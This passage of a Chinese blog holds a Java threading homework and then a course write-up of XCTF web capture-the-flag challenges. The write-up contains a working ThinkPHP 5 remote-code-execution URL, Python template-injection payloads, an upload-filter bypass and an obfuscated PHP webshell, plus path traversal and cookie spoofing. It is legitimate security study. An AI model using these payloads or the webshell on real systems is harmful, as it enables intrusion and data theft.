class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.MouseAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.MouseEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Control();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    JLabel label1;</span><br><span class="line">    Control()&#123;</span><br><span class="line">        <span class="keyword">this</span>.setBounds(<span class="number">200</span>,<span class="number">450</span>,<span class="number">400</span>,<span class="number">200</span>);</span><br><span class="line">        <span class="keyword">this</span>.setTitle(<span class="string">&quot;控制中心&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">        Font font = <span class="keyword">new</span> Font(<span class="string">&quot;微软雅黑&quot;</span>, Font.PLAIN, <span class="number">23</span>);</span><br><span class="line">        label1 = <span class="keyword">new</span> JLabel(<span class="string">&quot;点击本窗口以同时启动三个线程&quot;</span>);</span><br><span class="line">        label1.setFont(font);</span><br><span class="line">        add(label1);</span><br><span class="line">        <span class="keyword">this</span>.addMouseListener(<span class="keyword">new</span> MouseAdapter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseClicked</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">                actionPerformed();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">()</span></span>&#123;</span><br><span class="line">        myThread ta = <span class="keyword">new</span> myThread(<span class="number">200</span>,<span class="number">100</span>,<span class="number">0</span>);</span><br><span class="line">        myThread tb = <span class="keyword">new</span> myThread(<span class="number">500</span>,<span class="number">100</span>,<span class="number">1</span>);</span><br><span class="line">        myThread tc = <span class="keyword">new</span> myThread(<span class="number">800</span>,<span class="number">100</span>,<span class="number">2</span>);</span><br><span class="line">        ta.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        tb.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        tc.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="keyword">extends</span> <span class="title">JFrame</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> tid;</span><br><span class="line">    Thread t;</span><br><span class="line"></span><br><span class="line">    myThread(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> shape) &#123;</span><br><span class="line">        <span class="keyword">this</span>.tid = shape;</span><br><span class="line">        <span class="keyword">this</span>.setBounds(i, j, <span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">        <span class="keyword">this</span>.setTitle(<span class="string">&quot;Thread &quot;</span>+ shape);</span><br><span class="line">        <span class="keyword">this</span>.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">        startThreadA();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">startThreadA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        t = <span class="keyword">new</span> Thread(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            t.start();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.err.println(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Thread &quot;</span>+<span class="keyword">this</span>.tid +<span class="string">&quot; has started successfully.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                repaint();</span><br><span class="line">                Thread.sleep(<span class="number">255</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.err.println(e.toString());</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.paint(g);</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>.tid)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                g.setColor(Color.RED);</span><br><span class="line">                <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                g.fillRect(<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                g.setColor(Color.ORANGE);</span><br><span class="line">                <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                g.fillOval(<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                g.setColor(<span class="keyword">new</span> Color(<span class="number">7</span>,<span class="number">244</span>,<span class="number">161</span>));</span><br><span class="line">                <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                g.fillRoundRect(<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">50</span>+i*<span class="number">10</span>,<span class="number">100</span>,<span class="number">100</span>,<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>1.点击主控窗口同时启动三个线程，打开活动监视器，显示已创建3个线程：</p><p><img src="/img/78f216b49108da6692366aac8c9fbd48.jpeg"></p><p>2. 如下图所示，三个线程同时启动，各窗口同时绘制动态图形：</p><p><img src="/img/99480f314689f5a6326af9f4af98928b.png"></p><p><img src="/img/23fb013cb02df91f1a6e311bed35bbfc.png"></p><p>3. 再次点击主控窗口还可以创建更多的线程：</p><p><img src="/img/07d9f84c47bb6989d3ba9a08efb12b48.png"></p><p>4.线程创建成功后在控制台输出日志信息：<img src="/img/0349f3f7cd78dd52455bb58aef201dfd.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;作业一&quot;&gt;&lt;a href=&quot;#作业一&quot; class=&quot;headerlink&quot; title=&quot;作业一&quot;&gt;&lt;/a&gt;&lt;strong&gt;作业一&lt;/strong&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;计算多项式1！+2！+3！…+n!，当多项式之和超过10000时停止，并输出累加之和以</summary>
      
    
    
    
    
    <category term="课程作业" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    <category term="Java" scheme="https://zxy.link/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Web题目WP（一）</title>
    <link href="https://zxy.link/posts/7eaecac2/"/>
    <id>https://zxy.link/posts/7eaecac2/</id>
    <published>2021-11-15T10:00:00.000Z</published>
    <updated>2022-01-23T13:00:14.902Z</updated>
    
    <content type="html"><![CDATA[<div class="note info flat"><p>本文是《网络安全课程设计》的一项任务</p></div><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p><strong>题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</strong></p><p>robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。</p><p>于是应该读取robots.txt里的内容。</p><p><img src="/img/df9f5f5e75986b677ce32396cffd8cc9.png"></p><p>直接访问<a href="http://111.200.241.244:58484/f1ag_1s_h3re.php%E5%BE%97%E5%88%B0flag%E3%80%82">http://111.200.241.244:58484/f1ag_1s_h3re.php得到flag。</a></p><h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p><img src="/img/b2bd1f216d60ddfe07f4ace3182afe2c.png"></p><p>由题目名称可得知本题与robots协议有关，于是检查该站点有没有robots.txt文件：Disallow:<br>/fl0g.php表示网站禁止蜘蛛访问本目录，于是我们尝试访问<a href="http://111.200.241.244:63486/fl0g.php">http://111.200.241.244:63486/fl0g.php</a>，得到flag。<img src="/img/0ccb5d59c2010734adb4c98539b534dc.png"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>由题意得本题应该与ThinkPHP V5远程代码执行漏洞相关。在Github上搜索相关内容：</p><p><img src="/img/4fd2ab7182703b25198994e81a425125.png"></p><p>在网页中随意打开一个无效网址，得到报错提示：</p><p><img src="/img/a9cca3ac9c5022816ae10322324a7b66.png">由此我们可以得到版本号为ThinkPHP V5.0.20。在相关漏洞中检索，首先尝试<code>http://111.200.241.244:60671/?s=index/\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code>，可以发现远程代码执行成功：</p><p><img src="/img/326a10e0e05a53ff0c372081a203431c.png">于是将id换为ls以查找目录，不断进入上层目录发现flag文件：</p><p><img src="/img/c80c7f3d4d4d0ac99695d0d2ad79e1d0.png"></p><p>于是直接利用cat命令打开/flag目录，得到flag。</p><p><img src="/img/8f829e80fed6ebefee5ca0e3339f5ef8.png"></p><h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>由题意可得本题利用了Python-模板注入漏洞。在当前URL后面添加<code>&#123;&#123;[].class&#125;&#125;</code>可以得到如下结果，说明代码注入成功，网站已经执行了我们的代码。<img src="/img/e3e0d499e72c09732cf4a4134a10d736.png"></p><p>于是便可以利用python的os模块的<code>listdir()</code>函数来读取当前目录。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)  <span class="comment">#读取当前目录</span></span><br></pre></td></tr></table></figure><p>注入代码后得到：</p><p><img src="/img/469510da576d41cbe50d3e331c6a38fe.png"></p><p>发现当前目录中有fl4g文件，于是尝试打开该文件。使用Python中file模块的<code>read()</code>函数读取文件，并得到flag值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;fl4g&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="/img/fa75c00e91a77618bff21a57442ebc8f.png"></p><div class="note warning flat"><p>下文的“难度”指攻防世界的题目星级，最高为10星</p></div><h2 id="ics-07-（难度：5-10）"><a href="#ics-07-（难度：5-10）" class="headerlink" title="ics-07 （难度：5/10）"></a>ics-07 （难度：5/10）</h2><p>进入主页后发现左侧菜单栏和右侧一张图片，但菜单栏只有“项目管理”按钮有作用：</p><p><img src="/img/8e6eb9efc070cfff3e42cc8d54fb82b7.png"></p><p>进入后有一个登录界面和源代码查看按钮：</p><p><img src="/img/311ea86d8680347f7c15d4b5ff668f69.png"></p><p>查看源代码进行代码审计。</p><p>首先仔细阅读第一段代码，如果page不为空且不等于<code>index.php</code>，那么就会执行<code>include(&#39;flag.php&#39;);</code>否则会重定向到<code>flag.php</code>文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二段代码用来进行用户身份鉴别，判断session是不是admin，并获取值来匹配<code>ph(p[3457]?\|t\|tml)</code>，如果匹配成功（即<code>php3457</code>,<code>pht</code>,<code>phtml</code>），输出”<code>Bad file extension</code>“，并退出；否则写入文件。实际上这段代码是对php文件进行过滤，检验成功后文件上传到<code>/uploaded/backup/</code>的目录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename </span>= <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f </span>= fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第三段代码是对<code>get</code>参数<code>id</code>进行校验，如果id的浮点数不是1，且最后一位是9那么实行查询语句，如果查询正确，会得到一个admin的session。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id </span>= mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result </span>= mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result </span>= mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result </span>= <span class="literal">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们直接构造满足所有要求的payload：<code>?id=1a9&amp;page=flag.php</code>，成功绕过。</p><p><img src="/img/raoguo.png"></p><p>下面我们开始尝试文件上传。由第二段可以看到，我们只能用POST的方式上传文件，参数<code>con</code>是文件内容，参数<code>file</code>是文件名。我们使用中国蚁剑生成密码为zzz的木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$exRN</span>=create_function(str_rot13(<span class="string">&#x27;$&#x27;</span>).chr(<span class="number">0x307</span>-<span class="number">0x294</span>).chr(<span class="number">0155546</span>/<span class="number">0772</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).chr(<span class="number">01154</span>-<span class="number">01007</span>),chr(<span class="number">474</span>-<span class="number">373</span>).str_rot13(<span class="string">&#x27;i&#x27;</span>).base64_decode(<span class="string">&#x27;YQ==&#x27;</span>).base64_decode(<span class="string">&#x27;bA==&#x27;</span>).str_rot13(<span class="string">&#x27;(&#x27;</span>).chr(<span class="number">891</span>-<span class="number">855</span>).str_rot13(<span class="string">&#x27;f&#x27;</span>).chr(<span class="number">38628</span>/<span class="number">348</span>).str_rot13(<span class="string">&#x27;z&#x27;</span>).chr(<span class="number">54540</span>/<span class="number">540</span>).str_rot13(<span class="string">&#x27;)&#x27;</span>).str_rot13(<span class="string">&#x27;;&#x27;</span>));<span class="variable">$exRN</span>(base64_decode(<span class="string">&#x27;ODA5N&#x27;</span>.<span class="string">&#x27;jM5O0&#x27;</span>.<span class="string">&#x27;BldkF&#x27;</span>.<span class="string">&#x27;sKCRf&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">0x325</span>-<span class="number">0x2d0</span>).chr(<span class="number">01116</span>-<span class="number">01011</span>).chr(<span class="number">01371</span>-<span class="number">01300</span>).base64_decode(<span class="string">&#x27;VA==&#x27;</span>).str_rot13(<span class="string">&#x27;I&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">792</span>-<span class="number">722</span>).chr(<span class="number">0x650c</span>/<span class="number">0xdf</span>).base64_decode(<span class="string">&#x27;Ng==&#x27;</span>).chr(<span class="number">0x14b</span>-<span class="number">0xe6</span>).chr(<span class="number">0x2c5</span>-<span class="number">0x257</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;pdKTs&#x27;</span>.<span class="string">&#x27;yNDI4&#x27;</span>.<span class="string">&#x27;OTE3O&#x27;</span>.<span class="string">&#x27;w==&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由第二段代码我们可以发现正则判断.之后的字符，于是我们加个/.即可解决。所以我们post的payload是：</p><p><code>file=pa.php/.&amp;con=\&lt;?php \$exRN……;?\&gt;(省略处见前述木马)</code></p><p>成功连接中国蚁剑</p><p><img src="/img/c2501ab2a9daeef01e31dd752a762928.png"></p><p>打开/var/www/html/flag.php，得到flag。</p><p><img src="/img/e8d57c85d1a0679662431fc3f3f84ebe.png"></p><h2 id="wtf-sh-150-（难度：7-10）"><a href="#wtf-sh-150-（难度：7-10）" class="headerlink" title="wtf.sh-150 （难度：7/10）"></a>wtf.sh-150 （难度：7/10）</h2><p>进入网站后随便打开一篇文章，注意观察URL:</p><p><img src="/img/f22d356b05304e1feeed8ac13419de94.png"></p><p>注意到可能有路径穿越漏洞，于是尝试构造URL为<a href="http://111.200.241.244:55069/post.wtf?post=..%E5%BE%97%E5%88%B0%E7%BD%91%E7%AB%99%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9A">http://111.200.241.244:55069/post.wtf?post=..得到网站源代码：</a></p><p><img src="/img/b60f653a2b7edfaae6474c9946368d39.png"></p><p>直接Ctrl+F搜索“flag”关键词：</p><p><img src="/img/981b4430ec7ddfa32cc3893aed8b1e90.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/css/std.css&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">$ if contains &#x27;user&#x27; $&#123;!URL_PARAMS[@]&#125; &amp;&amp; file_exists &quot;users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;&quot;</span><br><span class="line">$ then</span><br><span class="line">$   local username=$(head -n 1 users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;);</span><br><span class="line">$   echo &quot;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>$&#123;username&#125;&#x27;s posts:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&quot;;</span><br><span class="line">$   echo &quot;<span class="tag">&lt;<span class="name">ol</span>&gt;</span>&quot;;</span><br><span class="line">$   get_users_posts &quot;$&#123;username&#125;&quot; | while read -r post; do</span><br><span class="line">$       post_slug=$(awk -F/ &#x27;&#123;print $2 &quot;#&quot; $3&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;post&#125;&quot;);</span><br><span class="line">$       echo &quot;<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>&quot;/<span class="attr">post.wtf</span>?<span class="attr">post</span>=<span class="string">$&#123;post_slug&#125;\</span>&quot;&gt;</span>$(nth_line 2 &quot;$&#123;post&#125;&quot; | htmlentities)<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>&quot;;</span><br><span class="line">$   done </span><br><span class="line">$   echo &quot;<span class="tag">&lt;/<span class="name">ol</span>&gt;</span>&quot;;</span><br><span class="line">$   if is_logged_in &amp;&amp; [[ &quot;$&#123;COOKIES[&#x27;USERNAME&#x27;]&#125;&quot; = &#x27;admin&#x27; ]] &amp;&amp; [[ $&#123;username&#125; = &#x27;admin&#x27; ]]</span><br><span class="line">$   then</span><br><span class="line">$       get_flag1</span><br><span class="line">$   fi</span><br><span class="line">$ fi</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意上面标出的代码，从中我们可以看出：当COOKIES是admin并且USERNAME为admin时，可以get_flag1，于是确定了之后努力的方向是得到admin的COOKIE值；从上面的代码中我们可以发现有/users目录，利用之前的路径穿越尝试进入该目录：</p><p><img src="/img/a1aa24e5ed4b944136edd15c9955de1a.png"></p><p>该目录直接存放着所有用户的cookie值，包括我们之前注册的用户1和admin。对比登录时的cookies：</p><p><img src="/img/cdcda0a57c0c36af0e8be0ccf64cef4f.png"></p><p>确定这里存放的就是所有用户的token值。所以我们直接利用cookie欺骗来登录admin账户。</p><p><img src="/img/c027351dd95584b54913e0b6661e9b21.png"></p><p><img src="/img/d8d85966e880b584a945d89247dd3aa0.png"></p><p>得到flag，但显然flag不完整，只是前半部分。</p><p>继续进行代码审计，发现<code>include_page</code>函数存在文件上传漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">include_page</span> </span>&#123;</span><br><span class="line">    <span class="comment"># include_page pathname</span></span><br><span class="line">    local pathname=$<span class="number">1</span></span><br><span class="line">    local cmd=</span><br><span class="line">    [[ $&#123;pathname(-<span class="number">4</span>)&#125; = <span class="string">&#x27;.wtf&#x27;</span> ]];</span><br><span class="line">    local can_execute=$;</span><br><span class="line">    page_include_depth=$((<span class="variable">$page_include_depth</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$page_include_depth </span>-lt <span class="variable">$max_page_include_depth </span>]]</span><br><span class="line">    then</span><br><span class="line">        local line;</span><br><span class="line">        <span class="keyword">while</span> read -r line; <span class="keyword">do</span></span><br><span class="line">            <span class="comment"># check if we&#x27;re in a script line or not ($ at the beginning implies script line)</span></span><br><span class="line">            <span class="comment"># also, our extension needs to be .wtf</span></span><br><span class="line">            [[ <span class="variable">$ </span>= $&#123;line01&#125; &amp;&amp; $&#123;can_execute&#125; = <span class="number">0</span> ]];</span><br><span class="line">            is_script=$;</span><br><span class="line">            <span class="comment"># execute the line.</span></span><br><span class="line">            <span class="keyword">if</span> [[ <span class="variable">$is_script </span>= <span class="number">0</span> ]]</span><br><span class="line">            then</span><br><span class="line">                cmd+=$<span class="string">&#x27;n&#x27;</span>$&#123;line<span class="comment">#$&#125;;</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> [[ -n <span class="variable">$cmd </span>]]</span><br><span class="line">                then</span><br><span class="line">                    <span class="keyword">eval</span> <span class="variable">$cmd  log Error during execution of</span> $&#123;cmd&#125;;</span><br><span class="line">                    cmd=</span><br><span class="line">                fi</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$line</span></span><br><span class="line">            fi</span><br><span class="line">        done  